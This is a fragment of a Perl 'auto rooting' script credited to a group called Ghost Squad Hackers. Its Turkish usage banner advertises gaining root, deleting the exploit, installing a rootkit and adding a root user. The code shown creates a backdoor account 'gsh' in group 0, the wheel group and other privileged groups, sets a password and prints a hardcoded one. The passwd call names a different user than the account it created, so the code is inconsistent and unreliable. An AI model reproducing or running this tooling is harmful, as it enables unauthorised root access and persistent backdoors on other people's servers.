#!/usr/bin/perl
#
# Auto Rooting Script Priv8
# GhosT Squad Hackers Self Destruct Exploit Tool ~ #GSH
...
#Developer: KRaLBaY  
#Home : Http://anonsturkey.pe.hu
#Contact : https://www.facebook.com/GhostSquadHackers/
#Greetz to all members of GhosT Squad Hackers
print "###########################################################\n";
print "#            Auto rooter by #GSH (WEB EDITION)            #\n";
print "#  Usage :                                                #\n";
print "#      ********************************************       #\n";
print "#    perl $0 r00t    => root olmak icin                   #\n";
print "#    perl $0 del     => exploiti silmek ici               #\n"; 
print "#    perl $0 -kit    => rootkit eklemek icin              #\n"; 
print "#    perl $0 user    => root user eklemek icin            #\n"; 
print "#      ********************************************       #\n";
print "#  [Home]:   Created FearLess                   #\n";
print "###########################################################\n";
...
print "user : [ gsh ]\n"; 
system "adduser -g 0 gsh -G wheel,sys,bin,daemon,adm,disk -d /sf7 -s /bin/sh"; 
system "passwd rootgsh"; 
print "pass is : rootgsh\n"; 
sleep(2);  
...
# Code By FonetHades  /* Ghost Squad Hackers F0r Ever */
# END